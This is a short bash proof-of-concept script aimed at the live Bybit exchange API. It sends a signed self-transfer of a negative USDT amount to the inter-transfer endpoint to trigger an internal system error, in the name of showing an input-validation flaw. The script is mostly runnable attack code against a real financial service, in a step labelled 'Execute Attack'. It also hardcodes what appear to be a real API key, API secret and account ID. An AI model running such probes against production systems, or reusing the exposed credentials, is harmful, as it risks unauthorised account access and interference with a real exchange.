#!/bin/bash
# Proof of Concept: Bybit API Internal System Error (10016)
# Vulnerability: Improper Error Handling / Input Validation Failure
# Target Endpoint: /v5/asset/transfer/inter-transfer

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL="https://api.bybit.com"
UID="527465456"

# 1. Sync Time
SERVER_TIME=$(curl -s "$BASE_URL/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4)
LOCAL_TIME=$(date +%s)
OFFSET=$((SERVER_TIME - LOCAL_TIME))

# 2. Prepare Payload (Self-Transfer with Negative Amount)
# This should be caught by input validation (e.g., "Invalid Amount"), 
# but instead causes an Internal System Error.
UUID=$(cat /proc/sys/kernel/random/uuid)
PAYLOAD="{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"-100\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

# 3. Sign Request
TIMESTAMP=$(($(date +%s) + OFFSET))000
RECV_WINDOW="5000"
SIGN_PAYLOAD="${TIMESTAMP}${API_KEY}${RECV_WINDOW}${PAYLOAD}"
SIGNATURE=$(echo -n "$SIGN_PAYLOAD" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')

# 4. Execute Attack
echo "--- REQUEST ---"
echo "POST /v5/asset/transfer/inter-transfer"
echo "Payload: $PAYLOAD"
echo "Timestamp: $TIMESTAMP"
echo ""

echo "--- RESPONSE ---"
curl -v -X POST "$BASE_URL/v5/asset/transfer/inter-transfer" \
  -H "X-BAPI-API-KEY: $API_KEY" \
  -H "X-BAPI-SIGN: $SIGNATURE" \
  -H "X-BAPI-SIGN-TYPE: 2" \
  -H "X-BAPI-TIMESTAMP: $TIMESTAMP" \
  -H "X-BAPI-RECV-WINDOW: $RECV_WINDOW" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" 2>&1
